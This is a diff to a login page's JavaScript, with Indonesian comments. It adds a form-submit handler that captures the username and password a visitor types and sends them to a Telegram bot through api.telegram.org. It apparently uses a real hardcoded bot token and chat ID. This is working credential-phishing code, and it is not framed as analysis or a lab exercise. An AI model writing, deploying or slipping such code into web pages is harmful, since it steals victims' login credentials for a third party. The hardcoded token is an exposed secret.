@@ -56,30 +56,35 @@ document.addEventListener('DOMContentLoaded', function() {
     //     alert('Login functionality would be implemented here in a real application.');
     // });
 
-    function sendToTelegram(e) {
-        e.preventDefault(); // ⛔ cegah reload halaman
-    
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-    
-        const message = `📥 Login Baru:\nUsername: ${username}\nPassword: ${password}`;
-        const botToken = 'ISI_TOKEN_BOT_KAMU';
-        const chatId = 'ISI_CHAT_ID_KAMU';
-    
+    const loginForm = document.querySelector('.login-form');
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        const message = `🔐 Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+        const botToken = '7851747348:AAE7Tj8ZH_I7UNN5c35BZb8c1mfYiU1qIRo';
+        const chatId = '6448306853'
+
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
         })
-        .then(() => {
-            alert("✅ Data berhasil dikirim ke Telegram!");
+        .then(response => response.json())
+        .then(data => {
+            alert('Login data terkirim ke bot Telegram!');
         })
-        .catch(err => {
-            alert("❌ Gagal mengirim data.");
-            console.error(err);
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Gagal mengirim data ke Telegram.');
         });
-    
-        return false; // ⛔ cegah reload halaman (lagi)
-    }
+    });
 
 });
